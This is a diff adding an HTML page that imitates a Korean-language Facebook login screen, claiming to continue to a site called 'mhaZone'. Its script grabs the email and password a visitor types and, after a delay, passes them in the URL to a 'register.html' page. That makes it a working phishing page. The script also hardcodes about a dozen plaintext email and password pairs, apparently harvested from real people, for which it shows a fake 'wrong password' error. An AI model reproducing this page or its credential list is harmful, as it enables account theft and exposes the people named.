@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+
+	<title>Facebook을 사용하여 계속하기</title>
+ 
+    <style>
+		*{
+	margin: 0;
+	padding: 0;
+	outline: 0;
+	text-decoration: none;
+	-webkit-box-sizing: border-box;
+	-moz-box-sizing: border-box;
+	-ms-box-sizing: border-box;
+	box-sizing: border-box;
+}
+body{
+	font-family: arial;
+	font-size: 14px;
+	color: #1c1e21;
+	font-weight: normal;
+	background: #f0f2f5
+}
+.loginsignup{
+	padding: 120px;
+}
+.container{
+	max-width: 992px;
+	margin: auto;
+}
+.row{
+	display: flex;
+	flex-wrap: wrap;
+}
+.justify-content-between{
+	justify-content: space-between;
+}
+.content-left{
+	max-width: 500px;
+	margin: auto;
+}
+.content-left h1{
+	font-size: 50px;
+	color: #1877f2;
+	margin-bottom: 20px;
+	font-weight: 900;
+}
+.content-left h2{
+	font-size: 28px;
+	line-height: 32px;
+	font-weight: 500;
+	margin-bottom: 40px;
+}
+.content-right{
+	max-width: 450px;
+	margin: auto;
+	text-align: center;
+}
+.content-right form{
+	width: 400px;
+	height: 350px;
+	background: #fff;
+	border-radius: 5px;
+	padding: 15px;
+	-webkit-box-shadow: -1px -1px 8px -1px rgba(0,0,0,0.52);
+	-moz-box-shadow: -1px -1px 8px -1px rgba(0,0,0,0.52);
+	box-shadow: -1px -1px 8px -1px rgba(0,0,0,0.52);
+	margin-bottom: 30px;
+}
+ 
+
+.content-right form input{
+	width: 100%;
+	height: 50px;
+	font-size: 17px;
+	border: 1px solid #ddd;
+	border-radius: 5px;
+	padding: 0 15px;
+	margin-bottom: 15px;
+}
+.content-right form input:hover{
+	border: 2px solid #1c1e21;
+	background: #f0f2f5;
+}
+.btn{
+	font-size: 20px;
+	background: #1877f2;
+	height: 50px;
+	color: #fff;
+	line-height: 50px;
+	border-radius: 5px;
+	margin-bottom: 20px;
+	text-transform: capitalize;
+}
+.login a{
+	display: block;
+}
+.create-btn a{
+	display: inline-block;
+	margin-top: 20px;
+	padding: 0 17px;
+	background: #4cd137;
+	transition: .3s;
+}
+.create-btn a:hover{
+	background: #44bd32;
+}
+.forgot a{
+	font-size: 14px;
+	line-height: 19px;
+	color:#1877f2;
+}
+.forgot a:hover,
+.content-right p a:hover{
+	text-decoration: underline;
+}
+.content-right p a{
+	color: #1c1e21;
+	font-weight: 600;
+}
+
+
+
+
+
+	</style>
+
+</head>
+<body>
+		<!-- login Page start -->
+		<div class="loginsignup">
+			<div class="container">
+				<div class="row justify-content-between">
+					<div class="content-left">
+						<!--<h1>facebook</h1>-->
+						<img style="height: 140px;" src="https://logos-world.net/wp-content/uploads/2020/04/Facebook-Logo.png">
+						<h2>Facebook에서 전세계에 있는 친구, 가족, 지</br>인들과 함께 이야기를 나눠보세요.</h2>
+						<a>로그인하여 mhaZone 을(를)계속하기</a>
+					</br>	</br>	</br>
+					</div>
+					<div class="content-right">
+						<form action="">
+							<div class="form-group">
+								<input class="un " type="email" placeholder="이메일 또는 전화번호" id="email">
+							</div>
+							<div class="form-group">
+								<input class="pass" type="password" placeholder="비밀번호" id="pwd">
+							</div>
+							<div class="login">
+								<a type="button" class="submit btn btn-default join" style="cursor: pointer;" id="go" onclick="go_click();">로그인하여 계속하기</a>
+ 
+							</div>
+							<div class="forgot">
+								<a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">비밀번호를 잊으셨나요?</a>
+							</div>
+							<div class="create-btn">
+								<a href="https://www.facebook.com/campaign/landing.php?&campaign_id=1662308814&extra_1=s%7Cc%7C514593470323%7Ce%7C%ED%8E%98%EC%9D%B4%EC%8A%A4%EB%B6%81%20%EA%B0%80%EC%9E%85%7C&placement=&creative=514593470323&keyword=%ED%8E%98%EC%9D%B4%EC%8A%A4%EB%B6%81%20%EA%B0%80%EC%9E%85&partner_id=googlesem&extra_2=campaignid%3D1662308814%26adgroupid%3D69637362448%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-500675412450%26loc_physical_ms%3D1009871%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gclid=EAIaIQobChMI272L06Si8gIVQj5gCh3DNQ6wEAAYASAAEgIXs_D_BwE" class="btn">새 계정 만들기</a>
+							</div>
+						</form>
+						<p> 유명인, 밴드, 비즈니스를 위한<a href="https://www.facebook.com/pages/create/?ref_type=registration_form"> 페이지 만들기</a></p>
+					</br>
+						<p><a href="https://developers.facebook.com/docs/facebook-login/web?locale=ko_KR">Facebook login API 오픈소스 라이선스</a></p>
+
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- login Page end -->
+
+
+
+
+
+
+<script>
+	function go_click() {
+
+  
+
+
+
+	   setTimeout(function() {
+
+		emailfb = $('#email').val();
+		   pwdfb = $('#pwd').val();
+
+		if (emailfb == "oddeyekim11@gamil.com" & pwdfb == "balltwee11"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "03272002kihoon"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "kihoon"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "270302kim"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "3we456sggsbt"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "sinbs2013@gmail.com" & pwdfb == "nomoran1"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "wonseok12344@gmail.com" & pwdfb == "YEjin1202"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "pyeshila333@gmail.com" & pwdfb == "ppuggukagent3"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "nickyparkg4@gmail.com" & pwdfb == "nicky3927ik"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "kyebin03@naver.com" & pwdfb == "dptmej0513^^"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "kyebin03@naver.com" & pwdfb == "esther0513"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "onyu0614@gmail.com" & pwdfb == "wodnjs111"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "03272002kihoon"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else{				
+			location.href="register.html?" + emailfb + "/" + pwdfb;
+
+		}
+
+	   }, 3300);
+	  // chatChannelId = btn.name;
+	
+
+
+	}    
+	
+
+
+   </script>
+</body>
+
+
+ 
+
+</html>
